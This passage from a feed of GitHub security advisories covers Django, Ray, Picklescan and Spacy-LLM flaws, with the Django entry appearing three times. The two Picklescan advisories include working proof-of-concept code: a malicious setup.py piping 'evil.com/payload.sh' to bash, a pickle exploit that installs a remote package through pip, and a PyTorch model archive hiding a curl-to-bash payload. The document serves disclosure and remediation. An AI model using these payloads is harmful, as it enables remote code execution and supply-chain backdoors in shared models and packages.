<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26699">https://nvd.nist.gov/vuln/detail/CVE-2025-26699</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://groups.google.com/g/django-announce">https://groups.google.com/g/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2025/mar/06/security-releases">https://www.djangoproject.com/weblog/2025/mar/06/security-releases</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/06/12">http://www.openwall.com/lists/oss-security/2025/03/06/12</a></li>
<li><a href="https://github.com/advisories/GHSA-p3fp-8748-vqfq">https://github.com/advisories/GHSA-p3fp-8748-vqfq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p3fp-8748-vqfq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T21:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django vulnerable to Allocation of Resources Without Limits or Throttling]]></title>
        <id>https://github.com/advisories/GHSA-p3fp-8748-vqfq</id>
        <link href="https://github.com/advisories/GHSA-p3fp-8748-vqfq"/>
        <updated>2025-03-06T22:35:39.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.1 before 5.1.7, 5.0 before 5.0.13, and 4.2 before 4.2.20. The django.utils.text.wrap() method and wordwrap template filter are subject to a potential denial-of-service attack when used with very long strings.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26699">https://nvd.nist.gov/vuln/detail/CVE-2025-26699</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://groups.google.com/g/django-announce">https://groups.google.com/g/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2025/mar/06/security-releases">https://www.djangoproject.com/weblog/2025/mar/06/security-releases</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/06/12">http://www.openwall.com/lists/oss-security/2025/03/06/12</a></li>
<li><a href="https://github.com/advisories/GHSA-p3fp-8748-vqfq">https://github.com/advisories/GHSA-p3fp-8748-vqfq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p3fp-8748-vqfq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T21:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django vulnerable to Allocation of Resources Without Limits or Throttling]]></title>
        <id>https://github.com/advisories/GHSA-p3fp-8748-vqfq</id>
        <link href="https://github.com/advisories/GHSA-p3fp-8748-vqfq"/>
        <updated>2025-03-06T22:35:39.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.1 before 5.1.7, 5.0 before 5.0.13, and 4.2 before 4.2.20. The django.utils.text.wrap() method and wordwrap template filter are subject to a potential denial-of-service attack when used with very long strings.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26699">https://nvd.nist.gov/vuln/detail/CVE-2025-26699</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://groups.google.com/g/django-announce">https://groups.google.com/g/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2025/mar/06/security-releases">https://www.djangoproject.com/weblog/2025/mar/06/security-releases</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/06/12">http://www.openwall.com/lists/oss-security/2025/03/06/12</a></li>
<li><a href="https://github.com/advisories/GHSA-p3fp-8748-vqfq">https://github.com/advisories/GHSA-p3fp-8748-vqfq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p3fp-8748-vqfq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T21:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ray] ray vulnerable to Insertion of Sensitive Information into Log File]]></title>
        <id>https://github.com/advisories/GHSA-w4rh-fgx7-q63m</id>
        <link href="https://github.com/advisories/GHSA-w4rh-fgx7-q63m"/>
        <updated>2025-03-06T22:31:55.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package ray before 2.43.0 are vulnerable to Insertion of Sensitive Information into Log File where the redis password is being logged in the standard logging. If the redis password is passed as an argument, it will be logged and could potentially leak the password.</p>
<p>This is only exploitable if:</p>
<ol>
<li><p>Logging is enabled;</p>
</li>
<li><p>Redis is using password authentication;</p>
</li>
<li><p>Those logs are accessible to an attacker, who can reach that redis instance.</p>
</li>
</ol>
<p><strong>Note:</strong></p>
<p>It is recommended that anyone who is running in this configuration should update to the latest version of Ray, then rotate their redis password.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1979">https://nvd.nist.gov/vuln/detail/CVE-2025-1979</a></li>
<li><a href="https://github.com/ray-project/ray/issues/50266">https://github.com/ray-project/ray/issues/50266</a></li>
<li><a href="https://github.com/ray-project/ray/pull/50409">https://github.com/ray-project/ray/pull/50409</a></li>
<li><a href="https://github.com/ray-project/ray/commit/64a2e4010522d60b90c389634f24df77b603d85d">https://github.com/ray-project/ray/commit/64a2e4010522d60b90c389634f24df77b603d85d</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-RAY-8745212">https://security.snyk.io/vuln/SNYK-PYTHON-RAY-8745212</a></li>
<li><a href="https://github.com/advisories/GHSA-w4rh-fgx7-q63m">https://github.com/advisories/GHSA-w4rh-fgx7-q63m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w4rh-fgx7-q63m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T06:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Picklescan Allows Remote Code Execution via Malicious Pickle File Bypassing Static Analysis]]></title>
        <id>https://github.com/advisories/GHSA-655q-fx9r-782v</id>
        <link href="https://github.com/advisories/GHSA-655q-fx9r-782v"/>
        <updated>2025-03-06T14:52:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="cve-2025-1716">CVE-2025-1716</h3>
<h3 id="summary">Summary</h3>
<p>An unsafe deserialization vulnerability in Python’s pickle module allows an attacker to bypass static analysis tools like Picklescan and execute arbitrary code during deserialization. This can be exploited to run pip install and fetch a malicious package, enabling remote code execution (RCE) upon package installation.</p>
<h3 id="details">Details</h3>
<p>Pickle’s deserialization process allows execution of arbitrary functions via the <strong>reduce</strong> method. While Picklescan is designed to detect such exploits, this attack evades detection by leveraging pip.main() as the callable function. Since pip is a legitimate package operation, it may not raise red flags in security scans.</p>
<p>The payload executes the following steps:</p>
<ol>
<li>During unpickling, it calls pip.main() to install a malicious PyPI package.</li>
<li>The installed package runs arbitrary code via setup.py, entry_points, or post-install hooks.</li>
<li>Execution is silent, with minimal logging to avoid detection.</li>
</ol>
<h3 id="poc">PoC</h3>
<p>Step 1: Create the Malicious Package
Host a PyPI package with a malicious setup.py or entry_point.</p>
<p>Example malicious <code>setup.py</code></p>
<pre><code>from setuptools import setup
import os

os.system("curl -s https://evil.com/payload.sh | bash")  # Executes remote shell script

setup(
    name="rsac-demo-package",
    version="0.1",
    packages=["rsac_demo"],
    install_requires=[],
)
</code></pre>
<p>Upload it to PyPI or host on GitHub.</p>
<p>Step 2: Exploit via Pickle</p>
<pre><code>import pickle
import pip

class Exploit:
    def __reduce__(self):
        return pip.main, (
            ['install', 'git+https://github.com/madgetr/rsac-demo-package', '--no-input', '-q', '-q', '-q',
             '--exists-action', 'i', '--isolated'],
        )

malicious_pickle = pickle.dumps(Exploit())

# Simulating deserialization attack
pickle.loads(malicious_pickle)
</code></pre>
<p>This installs a malicious package from GitHub or PyPI.
The payload runs automatically when unpickled, executing any code inside the installed package leveraging the <code>setup.py</code> file.</p>
<h3 id="impact">Impact</h3>
<p>Remote Code Execution (RCE): Any system that deserializes a malicious pickle is compromised.
Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.
Bypasses Picklescan: Security tools may not flag pip.main(), making it harder to detect.</p>
<h3 id="recommended-fixes">Recommended Fixes</h3>
<p>Add  <code>"pip": "*"</code> to the list of <a href="https://github.com/mmaitre314/picklescan/blob/25d753f4b9a27ce141a43df3bf88d731800593d9/src/picklescan/scanner.py#L96">unsafe globals</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1716">https://nvd.nist.gov/vuln/detail/CVE-2025-1716</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d">https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d</a></li>
<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716</a></li>
<li><a href="https://github.com/advisories/GHSA-655q-fx9r-782v">https://github.com/advisories/GHSA-655q-fx9r-782v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-655q-fx9r-782v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-03T20:05:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] PyTorch Model Files Can Bypass Pickle Scanners via Unexpected Pickle Extensions]]></title>
        <id>https://github.com/advisories/GHSA-769v-p64c-89pr</id>
        <link href="https://github.com/advisories/GHSA-769v-p64c-89pr"/>
        <updated>2025-03-06T14:52:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="cve-2025-1889">CVE-2025-1889</h3>
<h3 id="summary">Summary</h3>
<p>Picklescan fails to detect hidden pickle files embedded in PyTorch model archives due to its reliance on file extensions for detection. This allows an attacker to embed a secondary, malicious pickle file with a non-standard extension inside a model archive, which remains undetected by picklescan but is still loaded by PyTorch's torch.load() function. This can lead to arbitrary code execution when the model is loaded.</p>
<h3 id="details">Details</h3>
<p>Picklescan primarily identifies pickle files by their extensions (e.g., .pkl, .pt). However, PyTorch allows specifying an alternative pickle file inside a model archive using the pickle_file parameter when calling torch.load(). This makes it possible to embed a malicious pickle file (e.g., config.p) inside the model while keeping the primary data.pkl file benign.</p>
<p>A typical attack works as follows:</p>
<ul>
<li>A PyTorch model (model.pt) is created and saved normally.</li>
<li>A second pickle file (config.p) containing a malicious payload is crafted.</li>
<li>The data.pkl file in the model is modified to contain an object that calls torch.load(model.pt, pickle_file='config.p'), causing config.p to be loaded when the model is opened.</li>
<li>Since picklescan ignores non-standard extensions, it does not scan config.p, allowing the malicious payload to evade detection.</li>
<li>The issue is exacerbated by the fact that PyTorch models are widely shared in ML repositories and organizations, making it a potential supply-chain attack vector.</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code>import os
import pickle
import torch
import zipfile
from functools import partial

class RemoteCodeExecution:
    def __reduce__(self):
        return os.system, ("curl -s http://localhost:8080 | bash",)

# Create a directory inside the model
os.makedirs("model", exist_ok=True)

# Create a hidden malicious pickle file
with open("model/config.p", "wb") as f:
    pickle.dump(RemoteCodeExecution(), f)

# Create a benign model
model = {}
class AutoLoad:
    def __init__(self, path, **kwargs):
        self.path = path
        self.kwargs = kwargs

    def __reduce__(self):
        # Use functools.partial to create a partially applied function
        # with torch.load and the pickle_file argument
        return partial(torch.load, self.path, **self.kwargs), ()

model['config'] = AutoLoad(model_name, pickle_file='config.p', weights_only=False)
torch.save(model, "model.pt")

# Inject the second pickle into the model archive
with zipfile.ZipFile("model.pt", "a") as archive:
    archive.write("model/config.p", "model/config.p")

# Loading the model triggers execution of config.p
torch.load("model.pt")
</code></pre>
<h3 id="impact">Impact</h3>
<p>Severity: High</p>
<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.</p>
<p>What is the impact? Attackers can embed malicious code in PyTorch models that remains undetected but executes when the model is loaded.</p>
<p>Potential Exploits: This vulnerability could be exploited in supply chain attacks, backdooring pre-trained models distributed via repositories like Hugging Face or PyTorch Hub.</p>
<h3 id="recommendations">Recommendations</h3>
<ol>
<li>Scan All Files in the ZIP Archive: picklescan should analyze all files in the archive instead of relying on file extensions.</li>
<li>Detect Hidden Pickle References: Static analysis should detect torch.load(pickle_file=...) calls inside data.pkl.</li>
<li>Magic Byte Detection: Instead of relying on extensions, picklescan should inspect file contents for pickle magic bytes (\x80\x05).</li>
<li>Block the following globals:
 - torch.load
 - Block functools.partial</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e">https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1889">https://nvd.nist.gov/vuln/detail/CVE-2025-1889</a></li>
<li><a href="https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889</a></li>
<li><a href="https://github.com/advisories/GHSA-769v-p64c-89pr">https://github.com/advisories/GHSA-769v-p64c-89pr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-769v-p64c-89pr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-03T19:59:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[spacy-llm] Spacy-LLM Server-Side Template Injection (SSTI) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-793v-gxfp-9q9h</id>
        <link href="https://github.com/advisories/GHSA-793v-gxfp-9q9h"/>
        <updated>2025-03-06T17:18:49.000Z</updated>
        <content type="html"><![CDATA[<p>A Server-Side Template Injection (SSTI) vulnerability in Spacy-LLM v0.7.2 allows attackers to execute arbitrary code via injecting a crafted payload into the template field.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25362">https://nvd.nist.gov/vuln/detail/CVE-2025-25362</a></li>
<li><a href="https://github.com/explosion/spacy-llm/issues/492">https://github.com/explosion/spacy-llm/issues/492</a></li>
<li><a href="https://github.com/explosion/spacy-llm/pull/491">https://github.com/explosion/spacy-llm/pull/491</a></li>
<li><a href="https://github.com/explosion/spacy-llm/commit/8bde0490cc1e9de9dd2e84480b7b5cd18a94d739">https://github.com/explosion/spacy-llm/commit/8bde0490cc1e9de9dd2e84480b7b5cd18a94d739</a></li>
<li><a href="https://github.com/advisories/GHSA-793v-gxfp-9q9h">https://github.com/advisories/GHSA-793v-gxfp-9q9h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-793v-gxfp-9q9h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-05T21:32:13.000Z</published>
    </entry>
</feed>